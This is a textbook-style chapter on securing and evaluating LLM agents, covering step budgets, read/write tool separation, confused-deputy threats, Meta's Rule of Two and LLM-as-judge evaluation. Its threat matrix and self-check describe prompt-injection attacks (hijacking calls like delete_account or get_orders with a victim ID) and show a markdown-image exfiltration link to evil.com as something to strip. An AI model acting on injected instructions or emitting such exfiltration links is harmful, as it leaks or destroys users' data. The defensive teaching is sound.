# Chapter 12: AI Agents, Tool Guardrails & Evaluation Pipelines

*Part III · AI & LLM Engineering Systems · 8 min core · 25 min with deep dives*

A standard RAG pipeline is a **railroad track**: every user query goes through `Retrieve -> Rerank -> Generate` in a fixed number of steps.

An **AI Agent** is an **open loop** (`Thought -> Tool Call -> Observation -> Thought...`): the LLM itself decides which tools to call, inspects the output, and decides when to stop [1, 2].

That flexibility is magical in a demo—and terrifying in production when an agent gets stuck in an infinite retry loop, burns `$50` of tokens on a single user request, or gets tricked by a **Prompt Injection** hidden inside an email into calling `delete_account()`.

Let us look at the **lower half of the Enterprise RAG & Agents diagram in Chapter 11** to see how production teams make agents safe, bounded, and measurable [1, 2, 3].

---

### 1) The Three Non-Negotiable Guardrails Around an Agent Loop

Never deploy an unconstrained `while (!done)` loop around an LLM in production. Every production agent runtime enforces three hard boundaries [1, 2]:

1. **Bounded Step & Token Budget:** Hard-cap every agent turn at `max_steps = 5` (or `10`), `max_wall_clock = 25s`, and `max_tokens = 16,000`. If the agent hits the cap, gracefully summarize partial findings rather than spinning forever.
2. **Read vs. Write Tool Privilege Separation (Zero-Trust Tool Execution):**
   - **Read-only tools** (`search_docs`, `get_order_status`): Can execute automatically, with strict caller-scoped permissions (`user_id` injected by the server, **never** trusted from the LLM's JSON arguments!).
   - **High-impact write tools** (`refund_payment`, `delete_repo`, `send_email`): Require a deterministic **policy gate** (e.g., `refund_amount <= $20`) or explicit **human-in-the-loop confirmation** before execution [1].
3. **Input / Output Guardrails & PII Scrubbing:** Run a fast deterministic regex + lightweight classifier (< `15 ms`) in the **LLM Gateway** to strip SSNs, API keys, and credit card numbers before prompts leave your VPC, and validate structured tool outputs against strict JSON Schemas.

:::deepdive Production Failure & Security Threat Matrix (Model, Tool & Confused Deputy) | +5 min

In system design interviews, separate failures into **three distinct fault domains** so each gets a deterministic control:

| Fault Domain | Specific Failure / Threat | How It Is Detected | Deterministic Prevention / Mitigation |
| :--- | :--- | :--- | :--- |
| **1. Model & Loop Failures** | **Wrong-tool selection**, **premature completion** (claims success without calling write tool), or **repeated identical tool loops**. | Step trace lacks required mutation span; canonical hash `H(tool, args)` repeats `>= 2` times. | Scope toolset to `<= 15` clear schemas; verify expected post-condition state before closing task; abort duplicate call hashes. |
| **2. Tool & Infra Failures** | **Partial mutation** (Step 1 charges card, Step 2 order creation times out), **`429` rate limits**, or **hostile/oversized tool payloads**. | Uncommitted step state in run journal; payload exceeds `max_bytes` or schema check. | Enforce **idempotency keys** + **compensating Saga rollbacks** (`void_authorization`); validate & truncate tool outputs at the host boundary. |
| **3. Security & Confused Deputy** | **Confused Deputy** (agent uses its own broad service-account key on behalf of an unprivileged user) or **data exfiltration via URLs/markdown images** [5]. | Audit log shows resource tenant/ACL mismatch; outbound URL domain not in allow-list. | Exchange caller's token via **OAuth On-Behalf-Of (OBO, RFC 8693)** [4] (never shared admin keys!); strip external markdown image rendering (`![](https://evil.com?leak=...)`) in the UI [5]. |

:::

---

### 2) How Do You Know If Your AI System Got Worse? (Offline & Online Evaluation)

In traditional software, a unit test returns `true` or `false`. In an LLM/RAG system, you change your chunk size or upgrade a model, and accuracy subtly shifts across 10,000 edge cases.

Production AI systems rely on a **Two-Tier Evaluation Pipeline** [2, 3]:

| Eval Tier | When It Runs | What It Measures (The "RAG Triad") |
| :--- | :--- | :--- |
| **1. Offline Golden Dataset CI Gate (`200–500 curated cases`)** | On every Pull Request changing prompts, chunking, or models. | **Retrieval Recall@K & MRR:** Did the right document chunk land in the Top 5? **Deterministic Assertions:** Valid JSON, latency `< 2s`, zero leaked secrets. |
| **2. Async Online Production Eval (`1%–5% Kafka Sample`)** | Asynchronously in the background (zero impact on user latency!). | **Faithfulness / Groundedness (LLM-as-Judge):** Does every claim in the answer come strictly from the retrieved chunks (or did it hallucinate)? **Answer Relevance:** Did it actually answer the user's question? |

**Why must Online LLM-as-Judge run asynchronously off Kafka?**
Because running a judge LLM takes `1–2 seconds` and doubles token cost. By publishing `(query, retrieved_chunks, answer)` to a `rag.traces` Kafka topic and sampling `5%` in the background, you get real-time hallucination dashboards and alerts with **zero added latency (`0 ms`)** on the user's request [2, 3].

:::deepdive Calibrating Judges, Adversarial Slices & Safe Repo-Mutation Drill | +4 min

Never rely on a single uncalibrated LLM-as-Judge score:
1. **Combine Three Evaluators:**
   - **Code Assertions (100% deterministic):** Schema validity, forbidden-tool absence, citation ID existence, cost/step bounds.
   - **Calibrated LLM Judge:** Graded on binary `PASS/FAIL` criteria and periodically benchmarked against **100 human-labeled gold traces** (requiring Cohen's `κ >= 0.80` agreement with domain experts) [3, 6].
   - **Adversarial Regression Slice (`50+` red-team prompts):** Indirect prompt injections inside mock emails/READMEs, jailbreaks, and cross-tenant ID probes—requiring a strict **`0%` attack success rate** to merge [5].
2. **Design Drill — How Do You Let an Agent Modify a Git Repository Safely?**
   - **Isolation:** Clone into an ephemeral container/worktree with **zero production secrets** and no push credentials to `main`.
   - **Scoped Tools:** Expose typed tools (`read_file`, `search_code`, `apply_patch`, `run_targeted_tests`) with path canonicalization blocking `.git/hooks`, `.github/workflows`, and `..` traversal.
   - **Verification + Human Gate:** Require build + lint + unit tests to pass inside the sandbox before pushing to an isolated `agent/<run_id>` branch and opening a Draft PR for human review.

:::

---

:::deepdive Meta's "Rule of Two", Multi-Agent Failure Modes (MASFT) & PVE Gates | +4 min

1. **Pure vs. Consequential Tool Split & Meta's "Rule of Two" [7, 8]:**
   - Classify every tool in your registry as either **Pure** (read-only, deterministic, safe to run speculatively) or **Consequential** (mutates state, spends money, or sends data externally) [8].
   - Enforce **Meta's Rule of Two**: *a single agent turn or session context may combine at most TWO of three properties*: **(A) Untrusted Input** (web pages, external emails, PR comments), **(B) Sensitive Data Access** (private repos, PII, credentials), and **(C) Consequential External Action** (outbound network/email, database mutation, git push) [7]. Whenever `A + B + C` meet in one loop, an indirect injection inside `A` [10] can exfiltrate `B` via `C`—so the runtime must deterministically drop one leg (restrict `C` to read-only, isolate `A` behind a toolless reader, or pause for human confirmation).
2. **Multi-Agent System Failure Taxonomy (`MASFT`) [9]:**
   - Empirical trace audits across multi-agent benchmarks (`MASFT`, Cemri et al.) show failures cluster into three buckets that single-turn evals miss: **(1) Specification & Design** (role drift, disobeyed constraints, step repetition), **(2) Inter-Agent Misalignment** (context dropped across handoffs, reasoning–action mismatch, ignoring peer critiques), and **(3) Verification & Termination** (declaring premature success without running checks, or hallucinating past a `400` tool error) [9].
3. **Pre-Execution `PVE` (`Prompt–Validator–Executor`) Gate [8, 10]:**
   - Before executing any consequential tool call, run a fast (`<50 ms`), isolated **Validator** that sees **only** the user's original trusted request and the proposed `tool(args)`—*never* the untrusted retrieved documents—blocking hijacked tool calls before execution [10].

:::

:::deepdive Speculative `0 ms` Parallel Guardrails & Hybrid On-Device `SLM` vs. Cloud Routing | +4 min

1. **Eliminating the Serial Guardrail Latency Tax (`0 ms` Added `TTFT`) [2, 5]:**
   - Running guardrails serially (`Input Classifier 150 ms -> RAG 120 ms -> LLM TTFT 450 ms -> Output Classifier 150 ms`) adds **`+300 ms`** to every turn.
   - **Speculative Parallel Execution:** Fire the fast input PII/injection classifier **concurrently** with retrieval and speculative LLM prefill, **holding the first outbound SSE byte** in the gateway buffer until the input gate returns `ALLOW`. On the `99%` clean path, `TTFT` overhead is **`0 ms`**; on a `BLOCK` verdict, immediately trigger an upstream `AbortSignal` to cancel token generation with **`0` leaked bytes** [2].
   - On the outbound stream, scan text deltas at clause boundaries while **buffering `tool_calls` JSON completely on the server** until schema + policy checks pass.
2. **Hybrid On-Device Small Language Model (`1B–3B` `SLM`) vs. Cloud Frontier Routing [11]:**

| Dimension | On-Device Quantized `SLM` (`1B–3B` `INT4`) [11] | Cloud Frontier Model (`70B–500B+`) |
| :--- | :--- | :--- |
| **Latency & Cost** | **`<30–50 ms` local NPU/GPU**, **`$0` marginal cloud cost**, works `100%` offline. | `300–800 ms` network + prefill `TTFT`; billed per `1M` tokens. |
| **Privacy Boundary** | Raw local screen/clipboard/PII stays strictly on device; scrubs sensitive spans locally. | Receives **only PII-scrubbed structured intents** or consented context across TLS. |
| **Best Workload** | Intent routing, UI navigation classification, local entity extraction, and PII redaction [11]. | Complex multi-step planning, cross-domain synthesis, and broad code/tool generation [1]. |
| **Hard Constraint** | Tight RAM/installer budget (`~1–2 GB`) and lower multi-hop world knowledge. | Network availability, tail latency, and per-tenant token quotas. |

:::

---

### Quick Self-Check

<details>
<summary><strong>Q1: Why must an agent tool like <code>get_orders(user_id)</code> never trust the <code>user_id</code> parameter generated by the LLM?</strong></summary>
<p><strong>Answer:</strong> Because of <strong>Prompt Injection</strong>: an attacker can trick the LLM into generating <code>get_orders(user_id="victim_123")</code>. The authenticated <code>user_id</code> must always be bound by the backend execution harness from the session token.</p>
</details>

<details>
<summary><strong>Q2: What are the three core metrics of the "RAG Triad" used to pinpoint whether a bad AI answer was caused by the retriever or the generator?</strong></summary>
<p><strong>Answer:</strong> (1) <strong>Context Precision / Recall</strong> (did retrieval find the right chunks?), (2) <strong>Faithfulness / Groundedness</strong> (did the LLM stick strictly to those chunks without hallucinating?), and (3) <strong>Answer Relevance</strong> (did the response actually address the user's query?).</p>
</details>

<details>
<summary><strong>Q3: Why do we run LLM-as-Judge evaluations asynchronously on a 1–5% Kafka sample instead of synchronously before returning the answer?</strong></summary>
<p><strong>Answer:</strong> Running a synchronous LLM judge adds <code>1–2 seconds</code> of latency to every user response and doubles GPU token spend. Async sampling via Kafka adds <code>0 ms</code> to user latency while still catching quality regressions in production.</p>
</details>

<details>
<summary><strong>Q4: What is a "Confused Deputy" vulnerability in an enterprise agent, and how do you prevent it?</strong></summary>
<p><strong>Answer:</strong> A Confused Deputy happens when an agent holds a static, high-privilege service-account credential and an unprivileged user tricks it into reading or mutating restricted data. Prevent it by propagating down-scoped per-user tokens (OAuth On-Behalf-Of) to every downstream tool call.</p>
</details>

---

### Sources & References
- **[1]** Anthropic Engineering, *Building Effective Agents* (2024) — [anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents)
- **[2]** Chip Huyen, *AI Engineering: Building Applications with Foundation Models* (O'Reilly, 2025) — Evaluation, Guardrails & Agent Loops
- **[3]** Hamel Husain & Eugene Yan, *Your AI Product Needs Evals* — [applied-llms.org](https://applied-llms.org/)
- **[4]** IETF RFC 8693, *OAuth 2.0 Token Exchange (On-Behalf-Of Delegation & Audience Scoping)* — [datatracker.ietf.org/doc/html/rfc8693](https://datatracker.ietf.org/doc/html/rfc8693)
- **[5]** OWASP GenAI Security Project, *OWASP Top 10 for Large Language Model Applications (Prompt Injection & Excessive Agency)* — [genai.owasp.org/llm-top-10](https://genai.owasp.org/llm-top-10/)
- **[6]** Lianmin Zheng et al., *Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena* (NeurIPS 2023) — [arxiv.org/abs/2306.05685](https://arxiv.org/abs/2306.05685)
- **[7]** Meta AI Security, *Agents Rule of Two: A Practical Approach to AI Agent Security* (2025) — [ai.meta.com/blog/practical-ai-agent-security](https://ai.meta.com/blog/practical-ai-agent-security/)
- **[8]** Rohit Ghumare et al., *AI Engineering from Scratch — Phase 13: The Tool Interface & Trust Split* — [aiengineeringfromscratch.com/learn/tools-and-protocols/the-tool-interface](https://aiengineeringfromscratch.com/learn/tools-and-protocols/the-tool-interface)
- **[9]** Mert Cemri et al. (UC Berkeley), *Why Do Multi-Agent LLM Systems Fail? (MASFT)* (2025) — [arxiv.org/abs/2503.13657](https://arxiv.org/abs/2503.13657)
- **[10]** Kai Greshake et al., *Not What You've Signed Up For: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection* (AISec 2023) — [arxiv.org/abs/2302.12173](https://arxiv.org/abs/2302.12173)
- **[11]** Marah Abdin et al., *Phi-3 Technical Report: A Highly Capable Language Model Locally on Your Phone* (2024) — [arxiv.org/abs/2404.14219](https://arxiv.org/abs/2404.14219)
